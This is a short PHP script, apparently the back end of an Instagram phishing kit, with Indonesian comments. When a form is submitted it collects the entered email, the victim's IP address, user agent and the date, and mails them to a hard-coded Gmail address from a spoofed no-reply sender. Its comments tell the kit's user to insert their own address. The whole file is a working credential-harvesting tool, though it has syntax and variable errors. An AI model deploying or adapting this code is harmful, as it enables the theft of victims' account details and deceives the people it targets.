<?php
if (isset($_POST['user-email']) {
    $email = $_POST['user-email'];
    $ip_addr = $_SERVER['REMOTE_ADDR'];
    $uag = $_SERVER['HTTP_USER_AGENT'];
    $date = date('d/M/Y');
    $result_log = '
<font color="gray">
Email: '.$username.'<br>
Date: '.$date.'<br>
IP Address: '.$ip_addr.'<br>
User Agent: '.$uag.'<br>
</font>
';
$headers .= "X-Mailer: PHP/" . phpversion();
$cup_body = " $result_log \n"; //isi dari email yang dikirim ke email mu
$cup_to = "harvinkhong@gmail.com"; // email mu
$cup_headers = "MIME-Version: 1.0" . "\n";
$cup_headers .= "Content-type: text/html; charset=UTF-8" . "\n";
$cup_headers .= "From: no-reply@iagora.space \n"; //email pengirim ( modif aja sesuka loe )
$cup_headers .= "X-Mailer: PHP/" . phpversion();
$cup_subject = "Result Instagram | from $ip_addr "; //subject email yang akan dikirim ke emailmu ( modif sesuka loe )
@mail($cup_to, $cup_subject, $cup_body, $cup_headers); //perintah buat ngirim email
}
?>